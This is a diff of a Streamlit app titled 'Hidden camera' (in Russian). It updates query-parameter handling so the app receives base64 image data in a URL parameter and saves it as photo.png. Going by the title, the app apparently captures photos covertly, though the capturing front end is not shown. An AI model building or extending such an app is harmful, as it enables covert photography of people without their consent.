@@ -1,15 +1,19 @@
 import streamlit as st
 import streamlit.components.v1 as components
 import base64
-import os
 
-st.set_page_config(page_title="Камера", layout="centered")
+st.set_page_config(page_title="📸 Скрытая камера", layout="centered")
 
 st.title("📸 Скрытая камера")
 
-# Обработка фото с фронта
-if st.experimental_get_query_params().get("imgdata"):
-    data_url = st.experimental_get_query_params()["imgdata"][0]
+# Чтение query параметров
+params = st.query_params
+
+# Если пришло фото — сохранить
+if "imgdata" in params:
+    data_url = params["imgdata"]
+    if isinstance(data_url, list):
+        data_url = data_url[0]
     header, encoded = data_url.split(",", 1)
     img_bytes = base64.b64decode(encoded)
     with open("photo.png", "wb") as f:
